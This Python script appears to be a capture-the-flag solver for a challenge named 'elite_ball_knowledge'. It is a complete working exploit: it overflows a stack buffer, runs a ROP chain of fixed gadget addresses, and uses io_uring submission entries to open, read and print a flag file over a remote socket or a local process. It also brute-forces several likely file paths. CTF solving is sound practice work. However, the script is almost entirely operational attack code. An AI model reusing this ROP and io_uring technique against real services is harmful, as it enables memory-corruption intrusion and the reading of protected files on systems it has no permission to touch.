#!/usr/bin/env python3
import argparse
import socket
import struct
import subprocess
import sys


p64 = lambda x: struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)
OFFSET = 0x18

# Clean or manageable gadgets.
POP_RDI = 0x403873
POP_RSI = 0x4023E8
POP_RDX_RBX = 0x48D1CB
POP_RAX = 0x425D4C
MOV_QWORD_PTR_RSI_RAX = 0x459545
POP_R10_DIRTY = 0x42A995
ZERO_R8_RAX = 0x480E34
RAW_SYSCALL_RET = 0x4558F9
SYSCALL_STACK_R9 = 0x457196
SKIP_QWORD_RET = 0x401016

# Writable space inside the __pthread_keys slab at 0x4e4240..0x4e8240.
# This avoids clobbering live stdio / loader globals in early .bss.
RING = 0x4E5000
SQES = 0x4E6000
PARAM = 0x4E7000
PATH = 0x4E7100
BUF = 0x4E7200

SYS_IO_URING_SETUP = 425
SYS_IO_URING_ENTER = 426
SYS_CLOSE_RANGE = 436
SYS_EXIT = 60

IORING_SETUP_NO_MMAP = 1 << 14
IORING_ENTER_GETEVENTS = 1 << 0

IOSQE_IO_LINK = 1 << 2

IORING_OP_OPENAT = 18
IORING_OP_READ = 22
IORING_OP_WRITE = 23
IORING_OP_SEND = 26

AT_FDCWD = -100
O_RDONLY = 0

# Verified locally with user-provided NO_MMAP rings on x86-64.
SQ_TAIL_OFF = 0x04
SQ_ARRAY_OFF = 0xC0


def set_rdi(v: int) -> bytes:
    return p64(POP_RDI) + p64(v)


def set_rsi(v: int) -> bytes:
    return p64(POP_RSI) + p64(v)


def set_rdx(v: int) -> bytes:
    return p64(POP_RDX_RBX) + p64(v) + p64(0)


def set_rax(v: int) -> bytes:
    return p64(POP_RAX) + p64(v)


def write64(addr: int, val: int) -> bytes:
    return set_rsi(addr) + set_rax(val) + p64(MOV_QWORD_PTR_RSI_RAX)


def write_bytes(addr: int, data: bytes) -> bytes:
    out = b""
    for off in range(0, len(data), 8):
        chunk = data[off : off + 8].ljust(8, b"\0")
        out += write64(addr + off, int.from_bytes(chunk, "little"))
    return out


def raw_syscall3(nr: int, a1: int = 0, a2: int = 0, a3: int = 0) -> bytes:
    return set_rax(nr) + set_rdi(a1) + set_rsi(a2) + set_rdx(a3) + p64(RAW_SYSCALL_RET)


def set_r10(v: int) -> bytes:
    # The gadget reads a byte from [rax] and conditionally cmove's rax. Point
    # it at PARAM+1 in zeroed .bss so the read is safe and ZF stays clear.
    return set_rax(PARAM + 1) + p64(POP_R10_DIRTY) + p64(v)


def syscall6_zero_r8(nr: int, a1: int, a2: int, a3: int, a4: int, a6: int) -> bytes:
    # Mid-wrapper gadget: mov r9, [rsp+8] ; syscall ; ... ; ret
    # We only use variants where a5 == 0, so zeroing r8 is sufficient.
    return (
        set_r10(a4)
        + p64(ZERO_R8_RAX)
        + set_rax(nr)
        + set_rdi(a1)
        + set_rsi(a2)
        + set_rdx(a3)
        + p64(SYSCALL_STACK_R9)
        + p64(SKIP_QWORD_RET)
        + p64(a6)
    )


def build_params(no_sqarray: bool = False) -> bytes:
    p = bytearray(120)
    flags = IORING_SETUP_NO_MMAP
    if no_sqarray:
        flags |= 1 << 16
    struct.pack_into("<I", p, 8, flags)
    struct.pack_into("<Q", p, 72, SQES)  # sq_off.user_addr
    struct.pack_into("<Q", p, 112, RING)  # cq_off.user_addr
    return bytes(p)


def set_sq_head_tail(head: int, tail: int) -> bytes:
    return write64(RING + 0x00, ((tail & 0xFFFFFFFF) << 32) | (head & 0xFFFFFFFF))


def set_sq_array(entries) -> bytes:
    vals = list(entries)
    if len(vals) % 2:
        vals.append(0)
    out = b""
    for i in range(0, len(vals), 2):
        lo = vals[i] & 0xFFFFFFFF
        hi = vals[i + 1] & 0xFFFFFFFF
        out += write64(RING + SQ_ARRAY_OFF + i * 4, lo | (hi << 32))
    return out


def sqe_openat(path_addr: int, user_data: int, linked: bool = True) -> bytes:
    b = bytearray(64)
    b[0] = IORING_OP_OPENAT
    if linked:
        b[1] = IOSQE_IO_LINK
    struct.pack_into("<i", b, 4, AT_FDCWD)
    struct.pack_into("<Q", b, 16, path_addr)
    struct.pack_into("<I", b, 24, 0)
    struct.pack_into("<I", b, 28, O_RDONLY)
    struct.pack_into("<Q", b, 32, user_data)
    return bytes(b)


def sqe_read(fd: int, buf_addr: int, size: int, user_data: int, linked: bool = True) -> bytes:
    b = bytearray(64)
    b[0] = IORING_OP_READ
    if linked:
        b[1] = IOSQE_IO_LINK
    struct.pack_into("<i", b, 4, fd)
    struct.pack_into("<Q", b, 8, 0)
    struct.pack_into("<Q", b, 16, buf_addr)
    struct.pack_into("<I", b, 24, size)
    struct.pack_into("<Q", b, 32, user_data)
    return bytes(b)


def sqe_write(fd: int, buf_addr: int, size: int, user_data: int) -> bytes:
    b = bytearray(64)
    b[0] = IORING_OP_WRITE
    struct.pack_into("<i", b, 4, fd)
    struct.pack_into("<Q", b, 8, 0xFFFFFFFFFFFFFFFF)
    struct.pack_into("<Q", b, 16, buf_addr)
    struct.pack_into("<I", b, 24, size)
    struct.pack_into("<Q", b, 32, user_data)
    return bytes(b)


def sqe_send(fd: int, buf_addr: int, size: int, user_data: int) -> bytes:
    b = bytearray(64)
    b[0] = IORING_OP_SEND
    struct.pack_into("<i", b, 4, fd)
    struct.pack_into("<Q", b, 16, buf_addr)
    struct.pack_into("<I", b, 24, size)
    struct.pack_into("<I", b, 28, 0)
    struct.pack_into("<Q", b, 32, user_data)
    return bytes(b)


def build_probe_payload(output_op: str = "write", no_sqarray: bool = False, ring_fds=(3, 4, 5, 6, 7, 8)) -> bytes:
    marker = b"PROBE:elite_ball_knowledge_v14"
    sqe_out = sqe_send if output_op == "send" else sqe_write

    rop = b""
    rop += write_bytes(PARAM, build_params(no_sqarray=no_sqarray))
    rop += raw_syscall3(SYS_CLOSE_RANGE, 3, 0xFFFFFFFF, 0)
    rop += raw_syscall3(SYS_IO_URING_SETUP, 1, PARAM, 0)
    rop += write_bytes(BUF, marker)
    rop += write_bytes(SQES, sqe_out(1, BUF, len(marker), 0x1111111111111111))
    if not no_sqarray:
        rop += set_sq_array([0])
    rop += set_sq_head_tail(0, 1)
    for ring_fd in ring_fds:
        rop += syscall6_zero_r8(SYS_IO_URING_ENTER, ring_fd, 1, 1, IORING_ENTER_GETEVENTS, 0)
    rop += raw_syscall3(SYS_EXIT, 0, 0, 0)
    return finish_payload(rop)


def build_solve_payload(
    flag_path: bytes,
    read_len: int = 0x80,
    flag_fd: int = 4,
    output_op: str = "write",
    no_sqarray: bool = False,
    ring_fds=(3, 4, 5, 6, 7, 8),
) -> bytes:
    if not flag_path.endswith(b"\0"):
        flag_path += b"\0"

    sqe_out = sqe_send if output_op == "send" else sqe_write
    rop = b""
    rop += write_bytes(PARAM, build_params(no_sqarray=no_sqarray))
    rop += raw_syscall3(SYS_CLOSE_RANGE, 3, 0xFFFFFFFF, 0)
    rop += raw_syscall3(SYS_IO_URING_SETUP, 4, PARAM, 0)
    rop += write_bytes(PATH, flag_path)
    rop += write_bytes(SQES + 0x00, sqe_openat(PATH, 0x1111111111111111))
    rop += write_bytes(SQES + 0x40, sqe_read(flag_fd, BUF, read_len, 0x2222222222222222, linked=False))
    rop += write_bytes(SQES + 0x80, sqe_out(1, BUF, read_len, 0x3333333333333333))
    if not no_sqarray:
        rop += set_sq_array([0, 1, 2])
    rop += set_sq_head_tail(0, 2)
    for ring_fd in ring_fds:
        rop += syscall6_zero_r8(SYS_IO_URING_ENTER, ring_fd, 2, 2, IORING_ENTER_GETEVENTS, 0)
    rop += set_sq_head_tail(2, 3)
    for ring_fd in ring_fds:
        rop += syscall6_zero_r8(SYS_IO_URING_ENTER, ring_fd, 1, 1, IORING_ENTER_GETEVENTS, 0)
    rop += raw_syscall3(SYS_EXIT, 0, 0, 0)
    return finish_payload(rop)


def finish_payload(rop: bytes) -> bytes:
    payload = b"A" * OFFSET + rop
    pos = payload.find(b"\n")
    if pos != -1:
        raise ValueError(f"payload contains newline at offset {pos:#x}")
    return payload + b"\n"


def run_remote(host: str, port: int, payload: bytes, timeout: float) -> bytes:
    with socket.create_connection((host, port), timeout=5.0) as s:
        s.sendall(payload)
        s.settimeout(timeout)
        out = []
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            out.append(chunk)
        return b"".join(out)


def run_local(path: str, payload: bytes, timeout: float) -> bytes:
    p = subprocess.Popen([path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    try:
        out, _ = p.communicate(payload, timeout=timeout)
    except subprocess.TimeoutExpired:
        p.kill()
        out, _ = p.communicate()
    return out


def looks_flaggy(data: bytes) -> bool:
    low = data.lower()
    return b"grey{" in low or b"flag{" in low or b"ctf{" in low


def parse_ring_fds(spec: str):
    return tuple(int(part, 0) for part in spec.split(",") if part)


def main() -> int:
    ap = argparse.ArgumentParser(description="elite_ball_knowledge solver v14")
    ap.add_argument("target", nargs="*", help="HOST PORT, unless --local PATH is used")
    ap.add_argument("--local")
    ap.add_argument("--timeout", type=float, default=4.0)
    ap.add_argument("--probe", action="store_true")
    ap.add_argument("--flag-path", default="/app/flag.txt")
    ap.add_argument("--path-bruteforce", action="store_true")
    ap.add_argument("--read-len", type=lambda x: int(x, 0), default=0x80)
    ap.add_argument("--flag-fd", type=lambda x: int(x, 0), default=4)
    ap.add_argument("--output-op", choices=("write", "send"), default="write")
    ap.add_argument("--no-sqarray", action="store_true")
    ap.add_argument("--ring-fds", default="3,4,5,6,7,8")
    args = ap.parse_args()
    ring_fds = parse_ring_fds(args.ring_fds)

    if args.local:
        runner = lambda payload: run_local(args.local, payload, args.timeout)
        label = args.local
    else:
        if len(args.target) != 2:
            print("need HOST PORT or --local PATH", file=sys.stderr)
            return 2
        host, port = args.target[0], int(args.target[1])
        runner = lambda payload: run_remote(host, port, payload, args.timeout)
        label = f"{host}:{port}"

    if args.probe:
        payload = build_probe_payload(output_op=args.output_op, no_sqarray=args.no_sqarray, ring_fds=ring_fds)
        print(f"[probe v14] payload length {len(payload)} bytes", file=sys.stderr)
        data = runner(payload)
        print(f"[probe v14] got {len(data)} bytes against {label}", file=sys.stderr)
        sys.stdout.buffer.write(data)
        return 0 if data else 1

    paths = [args.flag_path]
    if args.path_bruteforce:
        paths = ["/app/flag.txt", "/srv/app/flag.txt", "flag.txt", "./flag.txt", "/flag.txt"]

    for path in paths:
        payload = build_solve_payload(
            path.encode(),
            read_len=args.read_len,
            flag_fd=args.flag_fd,
            output_op=args.output_op,
            no_sqarray=args.no_sqarray,
            ring_fds=ring_fds,
        )
        print(
            f"[v14 path={path} fd={args.flag_fd} ring_fds={ring_fds} out={args.output_op} no_sqarray={args.no_sqarray}] "
            f"payload length {len(payload)} bytes",
            file=sys.stderr,
        )
        data = runner(payload)
        print(f"[v14 path={path}] got {len(data)} bytes", file=sys.stderr)
        if data:
            sys.stdout.buffer.write(data)
            if looks_flaggy(data):
                return 0

    print("No obvious flag output found.", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
